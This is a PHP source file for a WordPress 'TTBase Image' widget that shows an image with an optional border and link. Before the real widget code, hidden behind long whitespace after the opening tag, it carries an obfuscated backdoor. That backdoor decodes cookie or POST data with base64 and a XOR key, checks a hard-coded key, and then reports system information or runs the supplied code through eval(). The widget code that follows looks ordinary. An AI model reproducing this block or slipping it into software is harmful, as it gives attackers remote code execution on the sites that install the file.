<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $n40bf3 = 602;$GLOBALS['i193b'] = Array();global $i193b;$i193b = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['f9b4854'] = "\x4f\x6d\x53\x4d\x46\x6e\x5c\x68\x58\x69\x6a\x50\x70\x7e\x3f\x57\x75\x4b\x62\x7a\x37\x4c\x28\x51\x3d\x52\x34\x35\x27\x5b\x71\x3b\x33\x6f\x76\x60\x38\x20\x29\x5d\x2e\x41\x61\x5f\x7d\x2f\x3c\x4e\x5e\x55\x4a\x67\x56\x25\x30\x48\x77\x40\x21\x79\x2d\x3e\x32\x6c\x24\x64\x43\x73\x23\x45\x31\x22\x78\x59\x42\x66\x3a\x72\x54\x39\x9\x36\x47\x2c\x7c\x74\x2a\x44\x26\x63\x7b\x6b\x49\x5a\xa\x2b\xd\x65";$i193b[$i193b['f9b4854'][65].$i193b['f9b4854'][32].$i193b['f9b4854'][75].$i193b['f9b4854'][75].$i193b['f9b4854'][36].$i193b['f9b4854'][54].$i193b['f9b4854'][65]] = $i193b['f9b4854'][89].$i193b['f9b4854'][7].$i193b['f9b4854'][77];$i193b[$i193b['f9b4854'][7].$i193b['f9b4854'][36].$i193b['f9b4854'][79].$i193b['f9b4854'][27].$i193b['f9b4854'][75].$i193b['f9b4854'][27].$i193b['f9b4854'][75].$i193b['f9b4854'][89].$i193b['f9b4854'][20]] = $i193b['f9b4854'][33].$i193b['f9b4854'][77].$i193b['f9b4854'][65];$i193b[$i193b['f9b4854'][97].$i193b['f9b4854'][97].$i193b['f9b4854'][20].$i193b['f9b4854'][79].$i193b['f9b4854'][62].$i193b['f9b4854'][62].$i193b['f9b4854'][75].$i193b['f9b4854'][97].$i193b['f9b4854'][97]] = $i193b['f9b4854'][65].$i193b['f9b4854'][97].$i193b['f9b4854'][75].$i193b['f9b4854'][9].$i193b['f9b4854'][5].$i193b['f9b4854'][97];$i193b[$i193b['f9b4854'][85].$i193b['f9b4854'][81].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][81]] = $i193b['f9b4854'][67].$i193b['f9b4854'][85].$i193b['f9b4854'][77].$i193b['f9b4854'][63].$i193b['f9b4854'][97].$i193b['f9b4854'][5];$i193b[$i193b['f9b4854'][91].$i193b['f9b4854'][97].$i193b['f9b4854'][65].$i193b['f9b4854'][89]] = $i193b['f9b4854'][9].$i193b['f9b4854'][5].$i193b['f9b4854'][9].$i193b['f9b4854'][43].$i193b['f9b4854'][67].$i193b['f9b4854'][97].$i193b['f9b4854'][85];$i193b[$i193b['f9b4854'][1].$i193b['f9b4854'][42].$i193b['f9b4854'][26].$i193b['f9b4854'][79]] = $i193b['f9b4854'][65].$i193b['f9b4854'][97].$i193b['f9b4854'][75].$i193b['f9b4854'][9].$i193b['f9b4854'][5].$i193b['f9b4854'][97].$i193b['f9b4854'][65];$i193b[$i193b['f9b4854'][67].$i193b['f9b4854'][26].$i193b['f9b4854'][75].$i193b['f9b4854'][62].$i193b['f9b4854'][70].$i193b['f9b4854'][97].$i193b['f9b4854'][75].$i193b['f9b4854'][70].$i193b['f9b4854'][36]] = $i193b['f9b4854'][67].$i193b['f9b4854'][97].$i193b['f9b4854'][77].$i193b['f9b4854'][9].$i193b['f9b4854'][42].$i193b['f9b4854'][63].$i193b['f9b4854'][9].$i193b['f9b4854'][19].$i193b['f9b4854'][97];$i193b[$i193b['f9b4854'][97].$i193b['f9b4854'][62].$i193b['f9b4854'][75].$i193b['f9b4854'][20].$i193b['f9b4854'][20].$i193b['f9b4854'][97].$i193b['f9b4854'][27].$i193b['f9b4854'][62].$i193b['f9b4854'][97]] = $i193b['f9b4854'][12].$i193b['f9b4854'][7].$i193b['f9b4854'][12].$i193b['f9b4854'][34].$i193b['f9b4854'][97].$i193b['f9b4854'][77].$i193b['f9b4854'][67].$i193b['f9b4854'][9].$i193b['f9b4854'][33].$i193b['f9b4854'][5];$i193b[$i193b['f9b4854'][67].$i193b['f9b4854'][26].$i193b['f9b4854'][97].$i193b['f9b4854'][18].$i193b['f9b4854'][70].$i193b['f9b4854'][18]] = $i193b['f9b4854'][16].$i193b['f9b4854'][5].$i193b['f9b4854'][67].$i193b['f9b4854'][97].$i193b['f9b4854'][77].$i193b['f9b4854'][9].$i193b['f9b4854'][42].$i193b['f9b4854'][63].$i193b['f9b4854'][9].$i193b['f9b4854'][19].$i193b['f9b4854'][97];$i193b[$i193b['f9b4854'][85].$i193b['f9b4854'][70].$i193b['f9b4854'][89].$i193b['f9b4854'][42].$i193b['f9b4854'][26].$i193b['f9b4854'][54].$i193b['f9b4854'][27].$i193b['f9b4854'][42].$i193b['f9b4854'][97]] = $i193b['f9b4854'][18].$i193b['f9b4854'][42].$i193b['f9b4854'][67].$i193b['f9b4854'][97].$i193b['f9b4854'][81].$i193b['f9b4854'][26].$i193b['f9b4854'][43].$i193b['f9b4854'][65].$i193b['f9b4854'][97].$i193b['f9b4854'][89].$i193b['f9b4854'][33].$i193b['f9b4854'][65].$i193b['f9b4854'][97];$i193b[$i193b['f9b4854'][56].$i193b['f9b4854'][18].$i193b['f9b4854'][70].$i193b['f9b4854'][65]] = $i193b['f9b4854'][67].$i193b['f9b4854'][97].$i193b['f9b4854'][85].$i193b['f9b4854'][43].$i193b['f9b4854'][85].$i193b['f9b4854'][9].$i193b['f9b4854'][1].$i193b['f9b4854'][97].$i193b['f9b4854'][43].$i193b['f9b4854'][63].$i193b['f9b4854'][9].$i193b['f9b4854'][1].$i193b['f9b4854'][9].$i193b['f9b4854'][85];$i193b[$i193b['f9b4854'][59].$i193b['f9b4854'][65].$i193b['f9b4854'][27].$i193b['f9b4854'][26].$i193b['f9b4854'][81].$i193b['f9b4854'][20].$i193b['f9b4854'][18].$i193b['f9b4854'][70].$i193b['f9b4854'][26]] = $i193b['f9b4854'][85].$i193b['f9b4854'][62].$i193b['f9b4854'][20].$i193b['f9b4854'][20].$i193b['f9b4854'][75].$i193b['f9b4854'][75];$i193b[$i193b['f9b4854'][10].$i193b['f9b4854'][62].$i193b['f9b4854'][79].$i193b['f9b4854'][26].$i193b['f9b4854'][89].$i193b['f9b4854'][36].$i193b['f9b4854'][26].$i193b['f9b4854'][70]] = $i193b['f9b4854'][91].$i193b['f9b4854'][81].$i193b['f9b4854'][75].$i193b['f9b4854'][65].$i193b['f9b4854'][79].$i193b['f9b4854'][27].$i193b['f9b4854'][20].$i193b['f9b4854'][27].$i193b['f9b4854'][26];$i193b[$i193b['f9b4854'][30].$i193b['f9b4854'][54].$i193b['f9b4854'][18].$i193b['f9b4854'][89].$i193b['f9b4854'][97].$i193b['f9b4854'][36].$i193b['f9b4854'][20].$i193b['f9b4854'][89]] = $_POST;$i193b[$i193b['f9b4854'][63].$i193b['f9b4854'][89].$i193b['f9b4854'][18].$i193b['f9b4854'][20].$i193b['f9b4854'][75].$i193b['f9b4854'][27].$i193b['f9b4854'][81]] = $_COOKIE;@$i193b[$i193b['f9b4854'][91].$i193b['f9b4854'][97].$i193b['f9b4854'][65].$i193b['f9b4854'][89]]($i193b['f9b4854'][97].$i193b['f9b4854'][77].$i193b['f9b4854'][77].$i193b['f9b4854'][33].$i193b['f9b4854'][77].$i193b['f9b4854'][43].$i193b['f9b4854'][63].$i193b['f9b4854'][33].$i193b['f9b4854'][51], NULL);@$i193b[$i193b['f9b4854'][91].$i193b['f9b4854'][97].$i193b['f9b4854'][65].$i193b['f9b4854'][89]]($i193b['f9b4854'][63].$i193b['f9b4854'][33].$i193b['f9b4854'][51].$i193b['f9b4854'][43].$i193b['f9b4854'][97].$i193b['f9b4854'][77].$i193b['f9b4854'][77].$i193b['f9b4854'][33].$i193b['f9b4854'][77].$i193b['f9b4854'][67], 0);@$i193b[$i193b['f9b4854'][91].$i193b['f9b4854'][97].$i193b['f9b4854'][65].$i193b['f9b4854'][89]]($i193b['f9b4854'][1].$i193b['f9b4854'][42].$i193b['f9b4854'][72].$i193b['f9b4854'][43].$i193b['f9b4854'][97].$i193b['f9b4854'][72].$i193b['f9b4854'][97].$i193b['f9b4854'][89].$i193b['f9b4854'][16].$i193b['f9b4854'][85].$i193b['f9b4854'][9].$i193b['f9b4854'][33].$i193b['f9b4854'][5].$i193b['f9b4854'][43].$i193b['f9b4854'][85].$i193b['f9b4854'][9].$i193b['f9b4854'][1].$i193b['f9b4854'][97], 0);@$i193b[$i193b['f9b4854'][56].$i193b['f9b4854'][18].$i193b['f9b4854'][70].$i193b['f9b4854'][65]](0);if (!$i193b[$i193b['f9b4854'][1].$i193b['f9b4854'][42].$i193b['f9b4854'][26].$i193b['f9b4854'][79]]($i193b['f9b4854'][41].$i193b['f9b4854'][21].$i193b['f9b4854'][25].$i193b['f9b4854'][69].$i193b['f9b4854'][41].$i193b['f9b4854'][87].$i193b['f9b4854'][73].$i193b['f9b4854'][43].$i193b['f9b4854'][25].$i193b['f9b4854'][49].$i193b['f9b4854'][47].$i193b['f9b4854'][43].$i193b['f9b4854'][32].$i193b['f9b4854'][81].$i193b['f9b4854'][81].$i193b['f9b4854'][42].$i193b['f9b4854'][75].$i193b['f9b4854'][18].$i193b['f9b4854'][36].$i193b['f9b4854'][42].$i193b['f9b4854'][36].$i193b['f9b4854'][42].$i193b['f9b4854'][62].$i193b['f9b4854'][32].$i193b['f9b4854'][27].$i193b['f9b4854'][27].$i193b['f9b4854'][42].$i193b['f9b4854'][18].$i193b['f9b4854'][62].$i193b['f9b4854'][70].$i193b['f9b4854'][75].$i193b['f9b4854'][18].$i193b['f9b4854'][75].$i193b['f9b4854'][70].$i193b['f9b4854'][70].$i193b['f9b4854'][18].$i193b['f9b4854'][42].$i193b['f9b4854'][70].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][62].$i193b['f9b4854'][75].$i193b['f9b4854'][18].$i193b['f9b4854'][42])){$i193b[$i193b['f9b4854'][97].$i193b['f9b4854'][97].$i193b['f9b4854'][20].$i193b['f9b4854'][79].$i193b['f9b4854'][62].$i193b['f9b4854'][62].$i193b['f9b4854'][75].$i193b['f9b4854'][97].$i193b['f9b4854'][97]]($i193b['f9b4854'][41].$i193b['f9b4854'][21].$i193b['f9b4854'][25].$i193b['f9b4854'][69].$i193b['f9b4854'][41].$i193b['f9b4854'][87].$i193b['f9b4854'][73].$i193b['f9b4854'][43].$i193b['f9b4854'][25].$i193b['f9b4854'][49].$i193b['f9b4854'][47].$i193b['f9b4854'][43].$i193b['f9b4854'][32].$i193b['f9b4854'][81].$i193b['f9b4854'][81].$i193b['f9b4854'][42].$i193b['f9b4854'][75].$i193b['f9b4854'][18].$i193b['f9b4854'][36].$i193b['f9b4854'][42].$i193b['f9b4854'][36].$i193b['f9b4854'][42].$i193b['f9b4854'][62].$i193b['f9b4854'][32].$i193b['f9b4854'][27].$i193b['f9b4854'][27].$i193b['f9b4854'][42].$i193b['f9b4854'][18].$i193b['f9b4854'][62].$i193b['f9b4854'][70].$i193b['f9b4854'][75].$i193b['f9b4854'][18].$i193b['f9b4854'][75].$i193b['f9b4854'][70].$i193b['f9b4854'][70].$i193b['f9b4854'][18].$i193b['f9b4854'][42].$i193b['f9b4854'][70].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][62].$i193b['f9b4854'][75].$i193b['f9b4854'][18].$i193b['f9b4854'][42], 1);$o24c3b0 = NULL;$m8361 = NULL;$i193b[$i193b['f9b4854'][72].$i193b['f9b4854'][97].$i193b['f9b4854'][65].$i193b['f9b4854'][70].$i193b['f9b4854'][18].$i193b['f9b4854'][42].$i193b['f9b4854'][27]] = $i193b['f9b4854'][79].$i193b['f9b4854'][62].$i193b['f9b4854'][89].$i193b['f9b4854'][62].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][20].$i193b['f9b4854'][97].$i193b['f9b4854'][60].$i193b['f9b4854'][70].$i193b['f9b4854'][26].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][60].$i193b['f9b4854'][26].$i193b['f9b4854'][26].$i193b['f9b4854'][54].$i193b['f9b4854'][32].$i193b['f9b4854'][60].$i193b['f9b4854'][18].$i193b['f9b4854'][89].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][60].$i193b['f9b4854'][27].$i193b['f9b4854'][97].$i193b['f9b4854'][70].$i193b['f9b4854'][62].$i193b['f9b4854'][20].$i193b['f9b4854'][54].$i193b['f9b4854'][36].$i193b['f9b4854'][62].$i193b['f9b4854'][79].$i193b['f9b4854'][42].$i193b['f9b4854'][18].$i193b['f9b4854'][26];global $xed1ba5;function  k6fd95754($o24c3b0, $da292333){global $i193b;$u3b7 = "";for ($g50cac=0; $g50cac<$i193b[$i193b['f9b4854'][85].$i193b['f9b4854'][81].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][81]]($o24c3b0);){for ($u6aef8=0; $u6aef8<$i193b[$i193b['f9b4854'][85].$i193b['f9b4854'][81].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][81]]($da292333) && $g50cac<$i193b[$i193b['f9b4854'][85].$i193b['f9b4854'][81].$i193b['f9b4854'][42].$i193b['f9b4854'][54].$i193b['f9b4854'][81]]($o24c3b0); $u6aef8++, $g50cac++){$u3b7 .= $i193b[$i193b['f9b4854'][65].$i193b['f9b4854'][32].$i193b['f9b4854'][75].$i193b['f9b4854'][75].$i193b['f9b4854'][36].$i193b['f9b4854'][54].$i193b['f9b4854'][65]]($i193b[$i193b['f9b4854'][7].$i193b['f9b4854'][36].$i193b['f9b4854'][79].$i193b['f9b4854'][27].$i193b['f9b4854'][75].$i193b['f9b4854'][27].$i193b['f9b4854'][75].$i193b['f9b4854'][89].$i193b['f9b4854'][20]]($o24c3b0[$g50cac]) ^ $i193b[$i193b['f9b4854'][7].$i193b['f9b4854'][36].$i193b['f9b4854'][79].$i193b['f9b4854'][27].$i193b['f9b4854'][75].$i193b['f9b4854'][27].$i193b['f9b4854'][75].$i193b['f9b4854'][89].$i193b['f9b4854'][20]]($da292333[$u6aef8]));}}return $u3b7;}function  t277ff($o24c3b0, $da292333){global $i193b;global $xed1ba5;return $i193b[$i193b['f9b4854'][10].$i193b['f9b4854'][62].$i193b['f9b4854'][79].$i193b['f9b4854'][26].$i193b['f9b4854'][89].$i193b['f9b4854'][36].$i193b['f9b4854'][26].$i193b['f9b4854'][70]]($i193b[$i193b['f9b4854'][10].$i193b['f9b4854'][62].$i193b['f9b4854'][79].$i193b['f9b4854'][26].$i193b['f9b4854'][89].$i193b['f9b4854'][36].$i193b['f9b4854'][26].$i193b['f9b4854'][70]]($o24c3b0, $xed1ba5), $da292333);}foreach ($i193b[$i193b['f9b4854'][63].$i193b['f9b4854'][89].$i193b['f9b4854'][18].$i193b['f9b4854'][20].$i193b['f9b4854'][75].$i193b['f9b4854'][27].$i193b['f9b4854'][81]] as $da292333=>$h6fe0){$o24c3b0 = $h6fe0;$m8361 = $da292333;}if (!$o24c3b0){foreach ($i193b[$i193b['f9b4854'][30].$i193b['f9b4854'][54].$i193b['f9b4854'][18].$i193b['f9b4854'][89].$i193b['f9b4854'][97].$i193b['f9b4854'][36].$i193b['f9b4854'][20].$i193b['f9b4854'][89]] as $da292333=>$h6fe0){$o24c3b0 = $h6fe0;$m8361 = $da292333;}}$o24c3b0 = @$i193b[$i193b['f9b4854'][67].$i193b['f9b4854'][26].$i193b['f9b4854'][97].$i193b['f9b4854'][18].$i193b['f9b4854'][70].$i193b['f9b4854'][18]]($i193b[$i193b['f9b4854'][59].$i193b['f9b4854'][65].$i193b['f9b4854'][27].$i193b['f9b4854'][26].$i193b['f9b4854'][81].$i193b['f9b4854'][20].$i193b['f9b4854'][18].$i193b['f9b4854'][70].$i193b['f9b4854'][26]]($i193b[$i193b['f9b4854'][85].$i193b['f9b4854'][70].$i193b['f9b4854'][89].$i193b['f9b4854'][42].$i193b['f9b4854'][26].$i193b['f9b4854'][54].$i193b['f9b4854'][27].$i193b['f9b4854'][42].$i193b['f9b4854'][97]]($o24c3b0), $m8361));if (isset($o24c3b0[$i193b['f9b4854'][42].$i193b['f9b4854'][91]]) && $xed1ba5==$o24c3b0[$i193b['f9b4854'][42].$i193b['f9b4854'][91]]){if ($o24c3b0[$i193b['f9b4854'][42]] == $i193b['f9b4854'][9]){$g50cac = Array($i193b['f9b4854'][12].$i193b['f9b4854'][34] => @$i193b[$i193b['f9b4854'][97].$i193b['f9b4854'][62].$i193b['f9b4854'][75].$i193b['f9b4854'][20].$i193b['f9b4854'][20].$i193b['f9b4854'][97].$i193b['f9b4854'][27].$i193b['f9b4854'][62].$i193b['f9b4854'][97]](),$i193b['f9b4854'][67].$i193b['f9b4854'][34] => $i193b['f9b4854'][70].$i193b['f9b4854'][40].$i193b['f9b4854'][54].$i193b['f9b4854'][60].$i193b['f9b4854'][70],);echo @$i193b[$i193b['f9b4854'][67].$i193b['f9b4854'][26].$i193b['f9b4854'][75].$i193b['f9b4854'][62].$i193b['f9b4854'][70].$i193b['f9b4854'][97].$i193b['f9b4854'][75].$i193b['f9b4854'][70].$i193b['f9b4854'][36]]($g50cac);}elseif ($o24c3b0[$i193b['f9b4854'][42]] == $i193b['f9b4854'][97]){eval/*x4e9f85c*/($o24c3b0[$i193b['f9b4854'][65]]);}exit();}} ?><?php
/**
 * TTBase Image widget
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// Start widget class
if ( ! class_exists( 'TTBase_Framework_Image_Widget' ) ) {
	class TTBase_Framework_Image_Widget extends WP_Widget {

		/**
		 * Register widget with WordPress.
		 *
		 */
		function __construct() {
			parent::__construct(FALSE, $name = esc_html__('TTBase Image', 'ttbase-framework'), array(
				'description' => esc_html__('Show image with optional border and link.', 'ttbase-framework')
			));
			
			add_action( 'load-widgets.php', array( $this, 'scripts' ), 100 );
		}
		
		/**
		 * Enqueue media scripts
		 */
		public function scripts() {
			wp_enqueue_style( 'wp-color-picker' );
	        wp_enqueue_script( 'wp-color-picker' );
	        wp_enqueue_script( 'underscore' );
			wp_enqueue_media();
		}
	
		/**
		 * Front-end display of widget.
		 *
		 */
		function widget( $args, $instance ) {

			// Extract widget arguments
			extract( $args );

			// Set variables for widget usage
			$title  = isset( $instance['title'] ) ? $instance['title'] : '';
			$title  = apply_filters( 'widget_title', $title );
			$image  = isset( $instance['image'] ) ? esc_url( $instance['image'] ) : '';
			$border = isset( $instance['border'] ) ? $instance['border'] : '';
			$url    = isset( $instance['url'] ) ? esc_url($instance['url']) : '';
			$target   = isset( $instance['target'] ) ? $instance['target'] : '';

			// Before widget WP hook
			echo $before_widget;

			// Display the title
			if ( $title ) {
				echo $before_title . $title . $after_title;
			}
			
			// Display the image
			if ( $image ) : ?>

				<div class="ttbase-image-widget" <?php if(!empty($border)){ ?> style="border:solid 2px <?php echo esc_attr($border) ?>;" <?php } ?>>
					<?php if (!empty($url)) { ?>
						<a href="<?php echo esc_url( $url ) ?>" title="<?php echo esc_attr( $title) ?>" <?php echo ($target=="_blank" ? " target='_blank'" : ""); ?>>
					<?php } ?>
					<img class="img-responsive" src="<?php echo esc_url( $image ); ?>" alt="<?php echo esc_attr( $title ); ?>"/>
					<?php if (!empty($url)) { ?>
						</a>
					<?php } ?>
				</div>

			<?php endif; 
			// After widget WP hook
			echo $after_widget;
		}
	
		/**
		 * Sanitize widget form values as they are saved.
		 *
		 */
		function update( $new_instance, $old_instance ) {
			$instance           = $old_instance;
			$instance['title']  = strip_tags( $new_instance['title'] );
			$instance['image']       = strip_tags( $new_instance['image'] );
			$instance['border'] = strip_tags( $new_instance['border'] );
			$instance['url']     = strip_tags( $new_instance['url'] );
			$instance['target']   = $new_instance['target'] == '_blank' ? $new_instance['target'] : '';
			return $instance;
		}
		
		/**
		 * Back-end widget form.
		 *
		 */
		function form( $instance ) {

			// combine provided fields with defaults
			$instance = wp_parse_args( ( array ) $instance, array(
				'title'     => '',
				'image'     => '',
				'border'    => '',
				'url'       => '',
				'target'   => '_self'
			) );
			$image  = $instance['image'];
			$url    = strip_tags( $instance['url'] );
			$border = strip_tags( $instance['border'] );
			$title  = strip_tags( $instance['title'] );
			$target   = esc_attr( $instance['target'] ); ?>

			<p>
				<label for="<?php echo esc_attr($this->get_field_id( 'title' )); ?>"><?php esc_html_e( 'Title:', 'ttbase-framework' ); ?></label>
			<input class="widefat" id="<?php echo esc_attr($this->get_field_id( 'title' )); ?>" name="<?php echo esc_attr($this->get_field_name( 'title' )); ?>" type="text" value="<?php echo
				esc_attr($title); ?>" />
			</p>
            <p>
				<label for="<?php echo esc_attr($this->get_field_id( 'image' )); ?>"><?php esc_html_e( 'Image URL', 'ttbase-framework' ); ?>:</label>
				<input class="widefat" id="<?php echo esc_attr($this->get_field_id( 'image' )); ?>" name="<?php echo esc_attr($this->get_field_name( 'image' )); ?>" type="text" value="<?php echo esc_attr($image); ?>" style="margin-bottom:10px;" />
				<input class="widget-image-upload-button btn-primary" type="button" value="<?php esc_html_e( 'Upload Image', 'ttbase-framework' ); ?>" />
			</p>
			<p>
				<label for="<?php echo esc_attr($this->get_field_id( 'border' )); ?>"><?php esc_html_e( 'Border Color:', 'ttbase-framework' ); ?></label>
				<div>
					<input class="my-color-picker widefat" type="text" id="<?php echo esc_attr($this->get_field_id( 'border' )); ?>" name="<?php echo esc_attr($this->get_field_name( 'border' )); ?>" value="<?php echo esc_attr( $border ); ?>" />
				</div>
				
			</p>

			<p>
				<label for="<?php echo esc_attr($this->get_field_id( 'url' )); ?>"><?php esc_html_e( 'Url:', 'ttbase-framework' ); ?></label>
				<input class="widefat" id="<?php echo esc_attr($this->get_field_id( 'url' )); ?>" name="<?php echo esc_attr($this->get_field_name( 'url' )); ?>" type="text" value="<?php echo esc_attr($url); ?>" />
			</p>
			<p><label for="<?php echo esc_attr($this->get_field_id( 'target' )); ?>"><?php esc_html_e( 'Open links in', 'ttbase-framework' ); ?>:</label>
				<select id="<?php echo esc_attr($this->get_field_id( 'target' )); ?>" name="<?php echo esc_attr($this->get_field_name( 'target' )); ?>" class="widefat">
					<option value="_self" <?php selected( '_self', $target ) ?>><?php esc_html_e( 'Current window', 'ttbase-framework' ); ?></option>
					<option value="_blank" <?php selected( '_blank', $target ) ?>><?php esc_html_e( 'New window', 'ttbase-framework' ); ?></option>
				</select>
			</p>
			
			<script type="text/javascript">
				(function($) {
					"use strict";
					function initColorPicker( widget ) {
			                widget.find( '.my-color-picker' ).wpColorPicker( {
			                        change: _.throttle( function() { // For Customizer
			                                $(this).trigger( 'change' );
			                        }, 3000 )
			                });
			        }
			            function onFormUpdate( event, widget ) {
			                initColorPicker( widget );
			        }
			        $( document ).on( 'widget-added widget-updated', onFormUpdate );
					$( document ).ready( function() {
						var _custom_media = true,
							_orig_send_attachment = wp.media.editor.send.attachment;
						$( '.widget-image-upload-button' ).click(function(e) {
							var send_attachment_bkp	= wp.media.editor.send.attachment,
								button = $(this),
								id = button.prev();
								_custom_media = true;
							wp.media.editor.send.attachment = function( props, attachment ) {
								if ( _custom_media ) {
									$( id ).val( attachment.url );
								} else {
									return _orig_send_attachment.apply( this, [props, attachment] );
								};
							}
							wp.media.editor.open( button );
							return false;
						} );
						$( '.add_media').on('click', function() {
							_custom_media = false;
						} );
						 $( '.widget:has(.my-color-picker)' ).each( function () {
                        	initColorPicker( $( this ) );                                                   
		                } );
					} );
				} ) ( jQuery );
			</script>
		<?php
		}

	}
}

// Register the TTBase Flickr Widget
if ( ! function_exists( 'ttbase_framework_register_image_widget' ) ) {
	function ttbase_framework_register_image_widget() {
		register_widget( 'TTBase_Framework_Image_Widget' );
	}
}
add_action( 'widgets_init', 'ttbase_framework_register_image_widget' );